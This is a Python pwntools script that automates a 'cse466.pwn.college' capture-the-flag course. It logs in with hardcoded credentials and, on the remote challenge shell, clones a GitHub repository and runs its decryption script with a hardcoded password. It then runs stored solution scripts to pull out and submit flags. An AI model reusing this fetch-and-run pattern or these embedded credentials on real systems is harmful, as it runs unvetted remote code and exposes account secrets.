from pwn import *
import sys, os
import signal
import IPython

class io:
    @classmethod
    def connect(cls, binary):
        cls.io = remote('cse466.pwn.college', 23)
        cls.readwrite('n0t_3v3n_d1ff1cul7')
        cls.readwrite('git_me_that_hug')
        cls.readwrite('zwimer')

        cls.readwrite('2')
        cls.readwrite('/pwn/' + binary)
        failed = cls.readuntil('$ ', timeout=5)
        if failed == '':
            cls.interactive()
    @classmethod
    def readwrite(cls, x, until = ': '):
        cls.readuntil(until)
        cls.sendline(x)
    @classmethod
    def readuntil(cls, x, timeout = None):
        return cls.readuntil_internal(x, time_out = timeout)
    @classmethod
    def readuntil_internal(cls, x, time_out):
        ret = cls.io.readuntil(x, timeout = time_out) if time_out else cls.io.readuntil(x)
        sys.stdout.write(ret)
        return ret
    @classmethod
    def write(cls, x):
        sys.stdout.write(x)
        cls.io.write(x)
    @classmethod
    def sendline(cls, x):
        cls.write(x + '\n')
    @classmethod
    def close(cls):
        cls.io.close()
    @classmethod
    def interactive(cls):
        try:
            cls.io.interactive()
        except TypeError:
            cls.interactive()


def block_stdout():
    sys.stdout = open(os.devnull, 'w')

def restore_stdout():
    sys.stdout = sys.__stdout__


def sigint_handler(sig, frame):
    IPython.embed()

def send_command(x):
    io.sendline(x + ';')
    return io.readuntil('$ ')

def extract_flag(has):
    prefix = 'CSE466{'
    return prefix + has.split(prefix)[1].split('}')[0] + '}'

def main():

    binary = sys.argv[1].split('.py')[0]
    io.connect(binary)
    send_command('pip install pwntools')
    send_command('export TERM=linux')

    send_command('git clone https://github.com/tmp4/tmp')

    send_command('cd tmp')
    io.sendline('./dec.sh')
    io.readuntil('password')
    io.sendline('100018065')
    io.readuntil('$ ')
    send_command('cd solutions')

    send_command('~/.local/bin/pip2.7 install ipython --user')
    io.sendline('~/.local/bin/ipython ' + binary + '.py')
    has_flag = io.readuntil('CSE466{') + io.readuntil('}')

    io.sendline('\n'*3 + 'exit;')
    if io.readuntil('Flag:', timeout = 10) == '':
        print 'Heads up, flag = ' + extract_flag(has_flag)
        io.sendline('\n'*3 + 'exit;')
        if io.readuntil('Flag:', timeout = 10) == '':
            print 'Heads up, flag = ' + extract_flag(has_flag)
            io.interactive()
    io.sendline(extract_flag(has_flag))
    io.readuntil(':')
    io.sendline('4')

if __name__ == '__main__':
    # signal.signal(signal.SIGINT, sigint_handler)
    main()
    # io.interactive()
    io.close()
